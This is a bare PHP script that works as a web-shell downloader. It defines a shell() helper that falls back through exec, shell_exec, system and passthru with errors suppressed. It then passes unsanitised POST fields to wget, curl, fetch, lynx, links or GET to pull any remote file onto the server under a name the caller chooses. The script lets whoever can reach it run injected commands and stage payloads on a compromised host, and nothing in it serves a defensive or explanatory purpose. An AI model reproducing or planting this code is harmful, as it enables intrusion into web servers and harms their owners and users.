<?php
function shell($cmd)
{
   $ret = '';

  if(function_exists('exec')){@exec($cmd,$ret);$ret = join("\n",$ret);}
  elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}
  elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}
  elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}
 
   return $ret;
}

switch($_POST['with'])
{
	case 'wget':shell('wget'." ".$_POST['urldown']." -O ".$_POST['filename']."");break;
 	case 'fetch':shell('fetch'." -o ".$_POST['filename']." -p ".$_POST['urldown']."");break;
 	case 'lynx':shell('lynx'." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	case 'links':shell('links'." -source ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	case 'GET':shell('GET'." ".$_POST['urldown']." > ".$_POST['filename']."");break;
 	case 'curl':shell('curl'." ".$_POST['urldown']." -o ".$_POST['filename']."");break;
}

die("");
?>